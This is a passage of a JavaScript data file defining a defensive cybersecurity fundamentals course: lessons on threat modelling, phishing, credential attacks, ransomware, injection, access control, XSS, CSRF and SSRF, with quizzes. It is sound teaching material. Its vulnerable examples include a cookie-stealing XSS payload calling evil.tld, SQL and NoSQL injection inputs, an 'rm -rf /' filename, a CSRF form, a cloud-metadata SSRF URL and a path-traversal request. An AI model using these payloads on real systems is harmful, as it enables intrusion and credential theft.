import { course, chapter, lesson, q } from '../authoring.js';

export default course({
  slug: 'cybersecurity-fundamentals',
  title: 'Cybersecurity Fundamentals',
  category: 'Security',
  level: 'Beginner → Intermediate',
  duration: '8 weeks',
  accent: 'emerald',
  coverKey: 'cybersecurity-fundamentals',
  summary:
    'Learn how real attacks work and how to shut them down — threat modelling, the OWASP Top 10, authentication, encryption, network defence, and the incident response plan you hope never to use.',
  description:
    'You threat model a feature, then fix the vulnerability classes that cause most breaches: injection, broken access control, XSS, CSRF, SSRF, and weak credential handling. Every chapter ends with defences you can apply to a real codebase or a five-person team the same afternoon.',
  chapters: [
    chapter(
      'Thinking Like a Defender',
      'What "secure" actually means, how to find threats before an attacker does, and how to layer defences that survive one failure.',
      [
        lesson('The CIA Triad and What Secure Really Means', 12, `
"Is it secure?" is an unanswerable question. Secure **against whom**, protecting **what property**, at **what cost**? Security engineering starts by replacing that vague word with three measurable properties.

### Confidentiality, Integrity, Availability

| Property | Promise | What failure looks like |
|---|---|---|
| **Confidentiality** | Only authorised parties can read the data | A student downloads another student's transcript |
| **Integrity** | Data cannot be changed without authorisation or detection | A student edits their own grade from a C to an A |
| **Availability** | The system is usable when it is needed | The exam portal is offline on exam day |

Most beginners hear "security" and think only of confidentiality — keeping secrets. That instinct causes real damage. **Integrity failures are usually worse than confidentiality failures**, because a leaked record is embarrassing while a silently altered record poisons every decision made from it afterwards. Ransomware is the clearest proof: its headline damage is to availability and integrity rather than secrecy — modern crews bolt data theft on top — and it still ends companies.

Two properties get bolted on so often they are worth naming:

- **Authenticity** — the data really came from who it claims to. Signatures and TLS certificates provide this.
- **Non-repudiation** — the actor cannot credibly deny the action later. Tamper-evident audit logs provide this.

### The properties fight each other

Every control trades one property against another, and pretending otherwise is how teams end up with security nobody uses:

\`\`\`text
Encrypt every backup with a key only the CTO holds
  → confidentiality UP, availability DOWN (CTO on holiday = no restore)

Lock an account after 3 failed logins
  → confidentiality UP, availability DOWN (anyone can lock out any user)

Mirror the database to a second region
  → availability UP, confidentiality DOWN (one more place to breach)
\`\`\`

The job is not to maximise all three. It is to decide, per asset, which property matters most and pay for that one deliberately.

### Do the exercise on your own system

Take one feature and write the three sentences. For a course platform's grade record:

- **C** — only the enrolled student and their instructor may read a grade.
- **I** — only an instructor may write a grade, and every write is logged with actor and timestamp.
- **A** — grades must be readable during the two-week results window; a four-hour outage in August is tolerable.

Those three sentences are now testable. "Only an instructor may write" becomes a line of code and a test:

\`\`\`js
// Deny by default, then allow the one case that is permitted.
function canWriteGrade(actor, enrolment) {
  if (actor.role !== 'instructor') return false;              // students never write
  return actor.id === enrolment.courseInstructorId;           // and only their own course
}
\`\`\`

Note what that function does *not* do: it never asks whether the UI showed a Save button. Chapter 3 shows why that distinction is the single most exploited bug on the web.

### Security is a property of a system, not a feature

You cannot buy confidentiality. It emerges from the weakest link across code, configuration, people, and process — the encrypted database with the password in a public GitHub repo is not encrypted in any way that matters. Every remaining chapter of this course is one of those links, and the whole point is that they multiply rather than add.
        `),
        lesson('Threat Modelling in an Afternoon', 14, `
Threat modelling is the cheapest security activity that exists: a whiteboard, an hour, and four questions that Adam Shostack made standard.

1. **What are we building?**
2. **What can go wrong?**
3. **What are we going to do about it?**
4. **Did we do a good job?**

### Step 1: draw the data flow, not the org chart

Sketch the feature as boxes and arrows, then draw a dotted line wherever data crosses from something you control less to something you control more. Those dotted lines are **trust boundaries**.

\`\`\`text
[Browser] --(1) upload PDF--> | TB | [API] --(2) write--> [S3 bucket]
                                        \\--(3) queue--> [Worker] --(4)--> [Postgres]

TB = trust boundary. Everything crossing it is attacker-controlled until proven otherwise.
\`\`\`

Keep the scope to **one feature**. The classic failure is trying to model the whole product, producing a diagram nobody reads and zero fixes. A model of the file upload alone will find real bugs by lunchtime.

### Step 2: apply STRIDE to each element

STRIDE is a checklist of what can go wrong, one letter per violated property:

| Letter | Threat | Violates | Example on our upload |
|---|---|---|---|
| **S** | Spoofing | Authenticity | A user uploads as someone else's account |
| **T** | Tampering | Integrity | The stored file is swapped after the virus scan |
| **R** | Repudiation | Non-repudiation | No log ties the upload to a user |
| **I** | Information disclosure | Confidentiality | Bucket is public; filenames are guessable |
| **D** | Denial of service | Availability | A 10 GB upload fills the disk |
| **E** | Elevation of privilege | Authorisation | An uploaded \`.php\` file is served and executed |

Walk each arrow in the diagram and ask all six. Six questions times four arrows is twenty-four prompts, and you will not get through them without finding something.

### Step 3: turn threats into rows

The output is a table someone owns, not a document someone files:

| Threat | Control | Owner | Status |
|---|---|---|---|
| Oversized upload fills disk | 20 MB limit at proxy **and** in app | Ayesha | done |
| Executable content served back | Serve from separate domain, force \`Content-Disposition: attachment\` | Bilal | todo |
| Guessable object keys | Key = random UUID, never the filename | Ayesha | done |
| No record of who uploaded | Structured audit log: actor, key, size, hash | Chen | todo |

Notice "at proxy **and** in app". Controls that exist in exactly one place fail the moment traffic reaches the app another way.

### Step 4: check your work

Ask three closing questions:

- Did we cover every trust boundary, or only the ones we find interesting?
- For each control, **how would we know it failed?** A control with no signal is a hope.
- What did we consciously accept? Write it down. "We accept that a compromised admin account can read all uploads; we mitigate with MFA and alerting" is a decision. Silence is an accident.

### The mistake to avoid

Do not start from a list of attacks and look for places they fit — that finds the attacks you already know. Start from *your* diagram and let STRIDE force questions you would not have asked. And re-run the model when the architecture changes: the day someone adds "share by public link", every confidentiality row you wrote needs revisiting.
        `),
        lesson('Trust Boundaries, Risk, and Defence in Depth', 13, `
The single most expensive misconception in application security is that the client is part of your system. It is not. Anything running on a device you do not control is **attacker-controlled input**, no matter how much of it you wrote.

### The client is never a trust boundary

\`\`\`js
// Vulnerable: the browser sends the price.
app.post('/api/checkout', async (req, res) => {
  const { courseId, price } = req.body;         // attacker sets price to 0
  await charge(req.user, price);
});

// Correct: the client sends identity of intent; the server decides the facts.
app.post('/api/checkout', async (req, res) => {
  const course = await Course.findById(req.body.courseId);
  if (!course) return res.status(404).json({ message: 'Not found' });
  await charge(req.user, course.priceCents);    // price comes from the database
});
\`\`\`

The same reasoning kills a whole family of bugs. Hidden form fields, disabled buttons, client-side validation, minified JavaScript, and mobile app binaries are all **suggestions to a cooperative user**, not constraints on a hostile one. Anyone can replay your request with \`curl\` and change any field in it.

### Risk = likelihood × impact

You cannot fix everything, so rank. A rough qualitative matrix beats a precise-looking spreadsheet nobody trusts:

| | Low impact | Medium impact | High impact |
|---|---|---|---|
| **Likely** | Fix soon | Fix now | Stop and fix |
| **Possible** | Backlog | Fix soon | Fix now |
| **Unlikely** | Accept | Backlog | Fix soon |

Two adjustments to apply honestly. Anything reachable **without authentication** moves up a row, because the attacker pool is the entire internet rather than your user list. Anything that is **trivially automatable** also moves up: a bug that pays off once is a nuisance, a bug a script runs ten million times is a breach.

### Defence in depth means independent layers

Layers only help if they fail independently. Our file upload, defended properly:

1. **Authentication** — only logged-in users may upload.
2. **Authorisation** — only into workspaces they belong to.
3. **Size and rate limits** — at the reverse proxy and in the app.
4. **Content validation** — sniff the real file type from magic bytes, not the extension or the client-supplied \`Content-Type\`.
5. **Storage isolation** — private bucket, random keys, no public listing.
6. **Serving isolation** — a separate domain so a malicious file cannot script against your session cookies.
7. **Detection** — alert on upload volume spikes and repeated rejections.

Any single layer can fail without the attacker winning. That is the whole design goal. A "layer" that shares a failure mode with the one beside it — two checks that both read the same client-supplied \`Content-Type\` header — is one layer wearing a disguise.

### Fail closed, and default to deny

\`\`\`js
// Dangerous: an exception in the permission service grants access.
let allowed = true;
try { allowed = await permissions.check(user, resource); } catch { /* ignored */ }

// Safe: unknown means no.
let allowed = false;
try { allowed = await permissions.check(user, resource); }
catch (err) { log.error({ err }, 'permission check failed'); }
if (!allowed) return res.status(403).json({ message: 'Forbidden' });
\`\`\`

The first version turns a database timeout into a privilege escalation, and it is one of the most common real bugs found in production code because the outage that triggers it looks like "the site got slower", not "everyone became an admin".

Pair fail-closed with **least privilege**: every account, service, token, and database user gets exactly the permissions it needs and nothing more. When a component is compromised — and one eventually is — least privilege is what decides whether you lose a component or a company.
        `),
      ],
      [
        q('A ransomware crew encrypts a hospital records database without reading it. Which properties were primarily attacked?', [
          'Confidentiality only',
          'Confidentiality and authenticity',
          'Availability and integrity',
          'Non-repudiation only',
        ], 2, 'Nobody read the data, but it can no longer be used or trusted as accurate — that is availability and integrity, not secrecy.'),
        q('While threat modelling a checkout flow, what is the most productive place to start?', [
          'Drawing the data flow and marking where data crosses a trust boundary',
          'Listing every CVE published for your framework this year',
          'Running an automated scanner against staging',
          'Reviewing the source code file by file',
        ], 0, 'STRIDE questions only become specific once you know which flows cross a boundary; scanners and CVE lists find what is already known, not what is unique to your design.'),
        q('A mobile app sends { itemId, priceCents } to POST /orders. Why is this a vulnerability?', [
          'JSON bodies can be intercepted by proxies',
          'Prices should be strings to avoid rounding errors',
          'The endpoint should be a PUT',
          'The client is attacker-controlled, so the price must be read from the server-side record',
        ], 3, 'Anything a client sends can be edited before it is sent; authoritative facts like price must be looked up server-side.'),
        q('A permission service throws on timeout and the calling code defaults allowed to true. What is the flaw called?', [
          'A race condition',
          'Failing open',
          'Privilege creep',
          'An injection flaw',
        ], 1, 'Failing open turns an availability incident into an authorisation bypass; security decisions must default to deny.'),
      ]
    ),
    chapter(
      'How Attacks Actually Work',
      'Phishing, credential attacks, malware and ransomware — the real mechanics, and the specific control that breaks each one.',
      [
        lesson('Phishing and Social Engineering', 13, `
Phishing is not a technology problem with a technology solution. It is a **pretext plus a payload**, and it works because it asks a busy person to do something that is part of their job.

### Anatomy of a message that works

A convincing phish has four parts, and you can grade any suspicious email against them:

| Part | What the attacker needs | Example |
|---|---|---|
| **Pretext** | A believable reason to act | "Payroll cut-off is 5pm today" |
| **Authority or urgency** | A reason not to verify | Sent "from" the CFO, marked urgent |
| **Plausible sender** | Something that survives a glance | \`accounts@micros0ft-billing.com\` |
| **Action** | Credentials, money, or execution | A login page, a wire transfer, a macro |

The sender line is where most people are caught, because email addresses were never designed to be trustworthy. The display name is arbitrary text the sender chooses. Lookalike domains use character swaps (\`rn\` for \`m\`, \`0\` for \`o\`) or unicode homoglyphs that render identically in most fonts. And subdomains read left to right, so \`login.yourbank.com.secure-verify.io\` is a domain called \`secure-verify.io\`. **Read the address backwards: the registrable domain is the one label to the left of the public suffix** — \`example.com\`, but \`example.co.uk\`, because \`co.uk\` is itself a suffix.

### The three defences that actually move the needle

**1. Phishing-resistant MFA.** A TOTP code from an authenticator app can be typed into a fake site and replayed by the attacker within thirty seconds. **WebAuthn / passkeys cannot**, because the credential is cryptographically bound to the real origin. The browser will not release a key registered for \`yourbank.com\` to \`secure-verify.io\` — no user judgement involved. This single change removes most credential phishing from your threat model.

**2. A password manager, used everywhere.** It is not just storage; it is a second pair of eyes. A password manager autofills based on the origin, so on a lookalike domain it simply does nothing. That silence is the warning. Teach staff that "the manager did not fill it in" means stop, not "type it manually".

**3. Email authentication, enforced.** SPF, DKIM and DMARC together stop attackers sending mail *as your own domain* — the most effective pretext there is.

\`\`\`text
; Publish these on your domain, then move policy up over a few weeks.
example.com.  TXT  "v=spf1 include:_spf.google.com -all"
_dmarc.example.com. TXT "v=DMARC1; p=none;   rua=mailto:dmarc@example.com"   ; week 1: observe
_dmarc.example.com. TXT "v=DMARC1; p=quarantine; pct=25; rua=..."             ; week 3
_dmarc.example.com. TXT "v=DMARC1; p=reject;  rua=mailto:dmarc@example.com"  ; the goal
\`\`\`

Leaving DMARC at \`p=none\` forever is the common mistake. It generates reports nobody reads and blocks nothing. The reports exist so you can reach \`p=reject\` safely.

### Business email compromise is the expensive one

The costly variant involves no malware at all: an attacker reads a real mailbox for weeks, learns the invoice cycle, then emails the finance team new bank details at exactly the right moment. No link, no attachment, correct thread, correct tone.

The only control that reliably stops it is procedural: **any change to payment details is verified out of band**, by phoning a number you already had on file — never one from the email. Write it as policy, rehearse it, and make it socially acceptable to delay a payment for a phone call.

### Build a reporting culture, not a shaming culture

Your fastest detection channel is the employee who clicked and felt sick about it. That channel closes the moment clicking has consequences. Give people a one-click Report Phish button, thank every reporter publicly including the false alarms, and respond to a real click with "thanks for telling us within a minute — that is exactly right" while you reset the session. Time-to-report is the metric that predicts blast radius; click rate is the metric that makes people hide.
        `),
        lesson('Credential Attacks: Stuffing, Spraying, and Brute Force', 14, `
Stolen credentials are the most common way into an organisation, and the four attacks that use them are routinely confused. They have different signatures and different defences.

| Attack | Method | Signature in your logs |
|---|---|---|
| **Brute force** | Many passwords against **one** account | Hundreds of failures on one username |
| **Password spraying** | **One** common password against **many** accounts | One or two failures each across thousands of usernames |
| **Credential stuffing** | Leaked email/password **pairs** replayed | Very high failure rate, but real successes mixed in |
| **Phishing** | The user hands it over | A *successful* login from a new device and country |

### Why stuffing works so well

Breach corpora contain billions of real email/password pairs. Attackers do not guess — they replay. Reuse rates in the general population sit high enough that a **0.1% to 2% success rate** is normal. Run a million pairs at 0.5% and you own five thousand accounts, from a residential proxy pool, at a cost of a few dollars.

That maths explains the defences. You cannot make guessing slower than an attacker who is not guessing. You have to make a correct password insufficient, and make reused passwords unusable.

### The controls, in order of value

**1. MFA, phishing-resistant where you can.** A valid password stops being an account takeover. Nothing else on this list comes close.

**2. Block known-breached passwords at registration and reset.** Have I Been Pwned exposes a k-anonymity range API: you send the first five characters of the SHA-1 hash and never the password itself.

\`\`\`js
import { createHash } from 'node:crypto';

// Defensive check: is this password already in a public breach corpus?
export async function isBreached(password) {
  const sha1 = createHash('sha1').update(password).digest('hex').toUpperCase();
  const prefix = sha1.slice(0, 5);          // only these 5 chars leave your server
  const suffix = sha1.slice(5);
  const res = await fetch(\`https://api.pwnedpasswords.com/range/\${prefix}\`);
  const body = await res.text();            // ~800 hash suffixes and counts
  return body.split('\\n').some((line) => line.split(':')[0] === suffix);
}
\`\`\`

**3. Rate limit on two dimensions.** Per-account limiting alone misses spraying, which touches each account once. Per-IP limiting alone misses stuffing from a botnet. Track both, plus a global failure-rate alarm — a jump from 3% to 60% failures across the whole login endpoint is stuffing in progress, and it is your best signal.

**4. Modern password policy.** Current NIST guidance (SP 800-63B) inverts what most sites still do: require **length** — a minimum of 8 characters, with 15 or more recommended — screen against breach lists, and **do not** force periodic rotation or composition rules. Forced rotation produces \`Summer2024!\` then \`Autumn2024!\`, which is worse than the passphrase it replaced. Rotate only on evidence of compromise.

### Two traps

**Account lockout is a denial-of-service switch.** Lock after five failures and anyone can lock any user out of your product by typing a wrong password five times. Prefer exponential backoff, a CAPTCHA after a threshold, and step-up verification for suspicious logins over hard locks.

**Do not leak which accounts exist.** This is the most common mistake in real authentication code, and it usually survives review because each message is individually helpful:

\`\`\`js
// Leaks: an attacker now has a validated list of your users.
if (!user) return res.status(404).json({ message: 'No account with that email' });
if (!ok)   return res.status(401).json({ message: 'Wrong password' });

// Safe: same body, same status, same shape.
return res.status(401).json({ message: 'Invalid email or password' });
\`\`\`

Enumeration hides in timing too. If a missing user returns in 5 ms and a real one takes 250 ms because bcrypt ran, the response time answers the question the message refused to. Hash a dummy password for unknown users so both paths cost the same.
        `),
        lesson('Malware and Ransomware', 13, `
"Malware" covers software with very different goals, and the goal determines where your defence should sit.

| Family | Goal | Typical entry |
|---|---|---|
| **Worm** | Spread without user action | Unpatched internet-facing service |
| **Trojan / loader** | Get a foothold, then fetch more | Cracked software, malicious installer |
| **Infostealer** | Harvest passwords, cookies, wallets | Fake download, malicious ad |
| **RAT** | Hands-on-keyboard remote control | Phish attachment, exposed RDP |
| **Ransomware** | Extort via encryption and leak threat | Stolen VPN credentials, phishing |
| **Cryptominer** | Steal compute quietly | Exposed container APIs, CI runners |

The infostealer row deserves attention. Stolen **session cookies** bypass MFA entirely — the attacker imports the cookie and is already logged in. That is why "log out all devices" and short session lifetimes matter after any endpoint compromise.

### Modern ransomware is a burglary, not an explosion

The encryption is the last step, and often days or weeks after the intrusion. A representative sequence:

\`\`\`text
1. Initial access   phished credential, or an unpatched VPN/edge appliance
2. Persistence      scheduled task, new local admin, legitimate remote-access tool
3. Discovery        map the network, find backups and the domain controller
4. Escalation       dump credentials, reach a domain admin account
5. Lateral movement spread using ordinary admin tooling
6. Exfiltration     copy the valuable data out  <-- the extortion leverage
7. Encryption       delete shadow copies, wipe backups, then encrypt
8. Extortion        pay to decrypt AND pay again to prevent publication
\`\`\`

Two implications. Because step 6 happens first, **"we restored from backup" is not a resolution** — the data is still stolen, and disclosure obligations still apply. And because steps 1–7 take time, you have days of detection opportunity if anyone is watching. Alert on shadow-copy deletion, new domain admins, and mass file renames.

### Where defensive money actually pays

**Close the front door.** Nearly all initial access is phishing, credential reuse, or an unpatched internet-facing service. MFA on remote access, patching anything exposed within days rather than quarters, and killing exposed RDP outperform any product you can buy.

**Make backups survive the attacker.** Ransomware crews hunt backups specifically. Use the **3-2-1-1-0** rule:

- **3** copies of the data
- on **2** different media
- with **1** off-site
- and **1** offline or immutable (object lock, WORM, tape)
- with **0** errors on a restore test you actually ran

The classic small-team mistake is a backup drive permanently mounted at \`Z:\\\` or an S3 bucket the application's own credentials can delete. Both get encrypted alongside everything else. The backup identity must be separate, write-only from the app's perspective, and unable to delete history.

**Restore tests are not optional.** An untested backup is a hope with a filename. Restore something real quarterly and time it — the number you discover is your actual recovery time objective, and it is usually several times the number in the plan.

### Endpoint controls worth the effort

Block macros in files from the internet, prefer application allowlisting on servers, run EDR rather than signature-only antivirus, and remove local admin from daily-driver accounts. That last one is unglamorous and enormously effective: most persistence and credential-dumping steps need administrator rights, and a standard user account denies them for free.
        `),
      ],
      [
        q('Why do passkeys stop credential phishing when app-based TOTP codes do not?', [
          'Passkeys are longer than six digits',
          'The credential is bound to the real origin, so a lookalike site cannot obtain a valid assertion',
          'Passkeys expire after 30 seconds',
          'Passkeys are stored in hardware only',
        ], 1, 'A TOTP code can be typed into a fake site and replayed; a WebAuthn key never releases an assertion to the wrong origin.'),
        q('Your login endpoint shows one or two failed attempts each against 8,000 different usernames from scattered IPs. This is', [
          'brute force against one account',
          'credential stuffing',
          'a distributed denial of service',
          'password spraying',
        ], 3, 'One common password tried once against many accounts is spraying, which is why per-account rate limits alone will not detect it.'),
        q('What does a k-anonymity breached-password check send to the external service?', [
          'The first five characters of the password hash only',
          'The password, over TLS',
          'The full hash of the password',
          'The username and a salted hash',
        ], 0, 'Only a five-character hash prefix leaves your server; the matching is completed locally against the returned suffix list.'),
        q('Ransomware operators exfiltrate data before encrypting it. What does that change for the defender?', [
          'Encryption keys can be recovered from the exfiltrated copy',
          'Backups become unnecessary',
          'Restoring from backup does not resolve the incident, because the breach and disclosure duty remain',
          'Only availability is affected',
        ], 2, "Double extortion means a clean restore fixes availability, but the stolen copy is still in the attacker's possession."),
      ]
    ),
    chapter(
      'The OWASP Top 10 in Practice',
      'Injection, broken access control, XSS, CSRF and SSRF — the vulnerability classes behind most real web breaches, with the fix for each.',
      [
        lesson('Injection: SQL, NoSQL, and Commands', 15, `
Every injection flaw has the same root cause: **untrusted data is concatenated into a string that an interpreter then parses as code.** Change nothing about the data and everything about how it is delivered, and the class disappears.

### SQL injection

\`\`\`js
// Vulnerable. Input: ' OR '1'='1' --
const sql = \`SELECT * FROM users WHERE email = '\${email}'\`;
// becomes: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// The interpreter sees your quote characters as syntax, so the value became logic.
\`\`\`

The fix is **parameterisation**, where the driver sends the statement and the values over separate channels. The value can never be reparsed as SQL, whatever it contains:

\`\`\`js
// Postgres (node-postgres)
await pool.query('SELECT id, email FROM users WHERE email = $1', [email]);

// MySQL2
await conn.execute('SELECT id, email FROM users WHERE email = ?', [email]);

// better-sqlite3
db.prepare('SELECT id, email FROM users WHERE email = ?').get(email);
\`\`\`

There is one place parameters cannot help: **identifiers**. You cannot bind a table or column name, so a sort parameter needs an allowlist, not escaping.

\`\`\`js
const SORTABLE = { title: 'title', created: 'created_at', price: 'price_cents' };
const sort = String(req.query.sort ?? '');
// hasOwn, not SORTABLE[sort]: a plain object inherits keys like "constructor".
const column = Object.hasOwn(SORTABLE, sort) ? SORTABLE[sort] : 'created_at';
const dir = req.query.dir === 'asc' ? 'ASC' : 'DESC';      // never interpolate raw
await pool.query(\`SELECT * FROM courses ORDER BY \${column} \${dir} LIMIT $1\`, [limit]);
\`\`\`

### NoSQL injection is not "safer by default"

MongoDB parses objects as query operators, so an ordinary JSON body can smuggle logic:

\`\`\`js
// Body: { "email": { "$ne": null }, "password": { "$ne": null } }
const user = await User.findOne({ email: req.body.email, password: req.body.password });
// Matches the first user in the collection. No quotes, no SQL, full bypass.
\`\`\`

The fix is type enforcement at the edge — validate that \`email\` is a **string** before it reaches the query, with Zod, Joi, or an explicit \`typeof\` check. Query operators only work because you let an object arrive where a string belonged.

### Command injection

\`\`\`js
// Vulnerable: a shell parses the whole string. filename = "a.png; rm -rf /"
exec(\`convert \${filename} out.png\`);

// Safe: no shell, and arguments are passed as a real array.
execFile('convert', [filename, 'out.png']);
\`\`\`

Rule: if you can avoid invoking a shell, avoid it. \`execFile\` and \`spawn\` with an argument array never let a semicolon become a command separator. When a shell is genuinely required, validate the input against a strict allowlist pattern first — and prefer a library binding over shelling out at all.

### The full picture

| Interpreter | Attack | Correct defence |
|---|---|---|
| SQL | SQL injection | Parameterised queries; allowlist identifiers |
| MongoDB | Operator injection | Enforce scalar types before querying |
| OS shell | Command injection | \`execFile\`/\`spawn\` with an args array, no shell |
| HTML | XSS | Contextual output encoding (next lesson but one) |
| LDAP / XPath | Filter injection | Library escaping APIs, never string building |
| Log files | Log forging | Structured logging, escape newlines |

### Two beliefs that cause real breaches

**"We use an ORM, so we are safe."** ORMs parameterise the query builder, and then expose \`sequelize.query()\`, \`knex.raw()\`, and \`$queryRawUnsafe\` for the hard cases. Those are exactly where injection appears, because they are used at the moments the developer is already improvising. Grep your codebase for the raw escape hatches today.

**"We strip dangerous characters."** Blocklists lose. Encodings, unicode variants, double-encoding, and comment syntax all provide routes around a filter, and the filter simultaneously breaks legitimate input — the user named O'Brien cannot register. Parameterisation is not a stronger filter; it removes the parsing step where the attack lives.

Defence in depth still applies: give the application's database user only the permissions it needs. A read-only reporting connection turns a catastrophic injection into a disclosure bug, which is a much better Tuesday.
        `),
        lesson('Broken Access Control', 14, `
Broken access control is ranked **number one** in the OWASP Top 10, and it is the one class that scanners are worst at finding — because a request that reads someone else's invoice looks exactly like a request that reads your own.

### Authentication is not authorisation

**Authentication** answers "who are you?". **Authorisation** answers "may you do this, to this specific object?". A valid session proves the first and says nothing about the second.

\`\`\`js
// Vulnerable: authenticated, but not authorised. Change 1043 to 1044 and read a stranger's invoice.
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice);
});

// Correct: the ownership constraint lives in the query itself.
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const invoice = await Invoice.findOne({ _id: req.params.id, ownerId: req.user.id });
  if (!invoice) return res.status(404).json({ message: 'Not found' });
  res.json(invoice);
});
\`\`\`

That is **IDOR** — insecure direct object reference. Two details in the fix matter. The ownership filter is part of the lookup rather than an \`if\` afterwards, so there is no path where a developer returns early and skips the check. And it returns **404, not 403**, so the response does not confirm that invoice 1044 exists.

Random UUIDs instead of sequential integers make enumeration slower, but they are **not** an access control. Ids leak in emails, referrer headers, screenshots and support tickets. Always scope the query.

### Missing function-level access control

\`\`\`jsx
// The UI hides the button...
{user.role === 'admin' && <button onClick={deleteUser}>Delete user</button>}
\`\`\`

...and the endpoint it calls happily accepts anyone's request. Hiding a control is a usability decision. The server must enforce the same rule independently, because the attacker never loads your UI.

The recurring version of this bug: a resource has five endpoints — view, edit, delete, export, and a webhook — and four of them check permissions. The export route, added six months later by someone else in a hurry, does not. **Enforce centrally so that adding a route cannot silently opt out:**

\`\`\`js
// Deny by default at the router, then declare what each route needs.
router.use(requireAuth);
router.get('/:id',        can('invoice:read'),   getInvoice);
router.patch('/:id',      can('invoice:write'),  updateInvoice);
router.get('/:id/export', can('invoice:read'),   exportInvoice);
router.delete('/:id',     can('invoice:delete'), deleteInvoice);
\`\`\`

### Mass assignment: privilege escalation through a field name

\`\`\`js
// Vulnerable: POST /api/users with { "email": "...", "role": "admin" }
const user = await User.create(req.body);

// Correct: an explicit allowlist of fields the client may set.
const { email, name } = req.body;
const user = await User.create({ email, name, role: 'student' });
\`\`\`

Never spread a request body into a model. Pick fields by name, or use a schema with \`stripUnknown\` behaviour so undeclared keys are discarded before they reach the database.

### Other shapes of the same bug

- **Path traversal** — \`GET /files?name=../../etc/passwd\`. Resolve the path and confirm it still sits inside the intended directory before opening it.
- **CORS misconfiguration** — reflecting the \`Origin\` header back with \`Access-Control-Allow-Credentials: true\` lets any site read authenticated responses. Use a fixed allowlist.
- **Force browsing** — \`/admin\` unlinked but unprotected. Obscurity is not a control.

### How to actually test it

Automated tooling will not find these. Create two accounts, do something as account A, capture the request, replay it verbatim with account B's session, and confirm you get 404 or 403. Then replay it with **no** session. Ten minutes of this per feature finds more real vulnerabilities than a week of scanning, and it converts nicely into an integration test that fails forever after if someone regresses the check.
        `),
        lesson('XSS, CSRF, and SSRF', 15, `
These three are constantly confused because their names rhyme. They are distinguished by **who gets tricked**: the user's browser, the user's credentials, or your server.

| Flaw | Who is tricked | Attacker gains |
|---|---|---|
| **XSS** | The victim's browser runs attacker JavaScript | Session theft, UI manipulation, keylogging |
| **CSRF** | The victim's browser sends an authenticated request | Actions performed as the victim |
| **SSRF** | Your server fetches an attacker-chosen URL | Access to internal networks and cloud metadata |

### XSS: untrusted data becomes markup

\`\`\`js
// Stored XSS. A profile bio of: <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)">
el.innerHTML = user.bio;      // the browser parses it as HTML and runs the handler

el.textContent = user.bio;    // safe: the browser renders it as text, never as markup
\`\`\`

React, Vue and Angular escape interpolated values by default, which is why XSS in a modern SPA almost always arrives through a deliberate escape hatch:

\`\`\`jsx
<div dangerouslySetInnerHTML={{ __html: post.body }} />   // only ever with sanitised HTML
\`\`\`

If you must render user HTML — a rich-text editor, say — sanitise with a maintained library such as DOMPurify, on the server, allowlisting tags and attributes. Never write your own sanitiser; the bypass lists are long and creative.

Two mitigations limit the damage when a bug slips through. Set session cookies **\`HttpOnly\`** so injected script cannot read them. And deploy a **Content Security Policy**, which stops injected inline script from executing at all:

\`\`\`text
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
\`\`\`

A CSP containing \`'unsafe-inline'\` in \`script-src\` provides essentially no XSS protection — that is the most common mistake in real deployments, added to make an existing inline script work and never removed.

### CSRF: the browser is too helpful

Browsers attach cookies for a domain to **every** request to that domain, including ones started by another site. So a page on \`evil.tld\` can auto-submit:

\`\`\`html
<form action="https://bank.example/transfer" method="POST" id="f">
  <input name="to" value="attacker"><input name="amount" value="5000">
</form>
<script>f.submit()</script>   <!-- the victim's session cookie rides along -->
\`\`\`

Defences, in order:

1. **\`SameSite=Lax\`** on session cookies (Chromium browsers apply it by default, so set it explicitly rather than relying on the browser) blocks cookies on cross-site POSTs. \`Strict\` is stronger but breaks inbound links into logged-in pages.
2. **An anti-CSRF token** — a random per-session value in a form field or custom header, compared server-side. The attacker's page cannot read it because of the same-origin policy.
3. **Never change state on GET.** A \`GET /delete?id=5\` is exploitable by an \`<img>\` tag.

The reason APIs using \`Authorization: Bearer\` headers are not CSRF-prone is that the browser does not attach those automatically — the attacker's page would have to read the token, which the same-origin policy forbids. **Cookies are the ingredient that creates CSRF.**

### SSRF: your server as a proxy

\`\`\`js
// Vulnerable "fetch this image URL" feature.
const r = await fetch(req.body.imageUrl);
\`\`\`

Your server sits inside the network perimeter, so the attacker supplies \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\` and receives cloud credentials, or \`http://localhost:9200/\` and reads your unauthenticated internal search index.

Defend by allowlist, not blocklist:

\`\`\`js
const ALLOWED = new Set(['images.partner.com', 'cdn.example.com']);
const url = new URL(req.body.imageUrl);
if (url.protocol !== 'https:' || !ALLOWED.has(url.hostname)) throw new Error('Blocked');
\`\`\`

When an open-ended fetcher is unavoidable: resolve DNS yourself and reject private ranges (\`127.0.0.0/8\`, \`10/8\`, \`172.16/12\`, \`192.168/16\`, \`169.254/16\`), **re-check after every redirect**, disable non-HTTP schemes, and enforce IMDSv2 so metadata needs a token. Blocking the literal string \`169.254.169.254\` is defeated by a DNS name that resolves to it — which is why the check must happen on the resolved address, not the text.
        `),
      ],
      [
        q('A search endpoint sorts by a column name from the query string. Why will a bound parameter not fix it?', [
          'Parameters cannot hold strings',
          'The ORDER BY clause runs before binding',
          'Parameters bind values, not identifiers, so the column name needs an allowlist',
          'It is safe already because ORDER BY cannot be injected',
        ], 2, 'Placeholders substitute values; table and column names are syntax, so map user input through a fixed allowlist instead.'),
        q('A Mongo login sends { "email": { "$ne": null }, "password": { "$ne": null } } and succeeds. The root cause is', [
          'a missing index on email',
          'that an object was accepted where a string was expected, so operators reached the query',
          'the password was not hashed',
          'that findOne returns the first document by design',
        ], 1, 'Validating the field as a scalar string at the edge removes the operator injection entirely.'),
        q('An API returns invoice 1044 to any authenticated user who asks for it. Which is the strongest fix?', [
          'Replace sequential ids with UUIDs',
          'Return 403 instead of 200',
          'Rate limit the endpoint',
          'Include the owner constraint in the database query itself',
        ], 3, 'Scoping the lookup to req.user.id makes it impossible to return another user record, while UUIDs only slow down enumeration.'),
        q('Which change removes CSRF risk from an endpoint without any token?', [
          'Authenticating with an Authorization header rather than an ambient cookie',
          'Validating the Referer header',
          'Requiring HTTPS',
          'Setting HttpOnly on the session cookie',
        ], 0, 'CSRF depends on credentials the browser attaches automatically; a header the attacker page cannot read or set is not sent cross-site.'),
      ]
    ),
